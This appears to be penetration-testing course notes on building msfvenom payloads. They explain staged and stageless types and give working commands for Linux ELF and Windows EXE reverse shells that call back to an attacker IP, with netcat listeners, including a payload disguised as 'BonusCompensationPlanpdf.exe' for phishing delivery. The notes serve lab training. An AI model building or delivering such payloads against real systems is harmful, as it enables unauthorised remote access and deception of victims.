
# Crafting Payloads with MSFvenom

Automated exploitation with Metasploit assumes **direct network access** to a vulnerable target. In real engagements, this is **not always possible**. You may face situations where:

* The target is not directly reachable
* Only user interaction is possible (email, download, USB, etc.)
* Exploit modules cannot be used directly

In these cases, **MSFvenom** allows you to **craft standalone payloads** that can be delivered and executed manually.

---

## What Is MSFvenom?

MSFvenom is Metasploit’s **payload generation tool**. It allows you to:

* Create standalone payload binaries
* Choose OS, architecture, shell type
* Encode or encrypt payloads
* Output payloads in different formats (.exe, .elf, .ps1, .raw, etc.)

Typical use cases:

* Phishing attacks
* Drive-by downloads
* File upload vulnerabilities
* Social engineering
* Post-exploitation pivoting

---

## Listing Available Payloads

```bash
msfvenom -l payloads
```

Key observations from payload listings:

1. Payload names start with the **target OS**

   * linux/
   * windows/
   * osx/
   * multi/

2. Payloads specify:

   * Architecture (x86, x64, arm, etc.)
   * Shell type (shell, meterpreter)
   * Communication method (reverse_tcp, reverse_http, bind_tcp)

---

## Staged vs Stageless Payloads

This is **critical exam and real-world knowledge**.

### Staged Payloads

Example:

```
linux/x86/shell/reverse_tcp
windows/meterpreter/reverse_tcp
```

How they work:

1. A small **stager** is executed first
2. The stager connects back to the attacker
3. The full payload is downloaded and executed

Pros:

* Smaller initial payload
* Flexible payload handling

Cons:

* More network traffic
* Less stable on high latency links
* Easier to detect

---

### Stageless Payloads

Example:

```
linux/x64/shell_reverse_tcp
windows/meterpreter_reverse_tcp
```

How they work:

* Entire payload is sent and executed **at once**
* No second-stage download

Pros:

* More stable
* Less network noise
* Better for social engineering

Cons:

* Larger payload size

---

### How to Identify Them Quickly

| Payload Name Pattern       | Type      |
| -------------------------- | --------- |
| `/shell/reverse_tcp`       | Staged    |
| `_shell_reverse_tcp`       | Stageless |
| `/meterpreter/reverse_tcp` | Staged    |
| `_meterpreter_reverse_tcp` | Stageless |

Slashes (`/`) usually indicate **staging**.

---

## Building a Stageless Linux Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=10.10.14.113 LPORT=443 \
-f elf > createbackup.elf
```

### Command Breakdown

| Component                   | Meaning                              |
| --------------------------- | ------------------------------------ |
| msfvenom                    | Payload generator                    |
| -p                          | Specify payload                      |
| linux/x64/shell_reverse_tcp | Linux 64-bit stageless reverse shell |
| LHOST                       | Attacker IP                          |
| LPORT                       | Attacker listening port              |
| -f elf                      | Output format                        |
| > createbackup.elf          | Output file                          |

Why this works well:

* Uses common outbound port (443)
* No staging traffic
* Looks like a normal Linux binary

---

## Executing the Linux Payload

On the attacker:

```bash
nc -lvnp 443
```

On the target:

```bash
chmod +x createbackup.elf
./createbackup.elf
```

Result:

* Reverse shell connects back
* Full OS interaction available

---

## Building a Stageless Windows Payload

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.10.14.113 LPORT=443 \
-f exe > BonusCompensationPlanpdf.exe
```

### Key Differences vs Linux

* Output format is `.exe`
* Architecture defaults to x86 unless specified
* Much larger file size

---

## Executing the Windows Payload

On the attacker:

```bash
nc -lvnp 443
```

On the target:

* User double-clicks the file
* Reverse shell connects back

Result:

```text
C:\Users\htb-student\Downloads>
```

---

## Why Raw Payloads Get Detected

Unencoded payloads:

* Match known AV signatures
* Trigger AMSI and Defender
* Are trivial to detect

This is expected behavior.

---

## Key Takeaways

* MSFvenom is for **manual payload delivery**
* Stageless payloads are preferred for stability
* Payload naming reveals behavior
* Listener must be ready **before execution**
* Social engineering is often the delivery method
* Raw payloads will be detected unless obfuscated

---

## What Comes Next (Important)

To make MSFvenom payloads realistic, you must learn:

* Encoders (`-e`)
* Iterations (`-i`)
* Template injection
* PowerShell payloads
* AV evasion basics
* Payload delivery via exploits
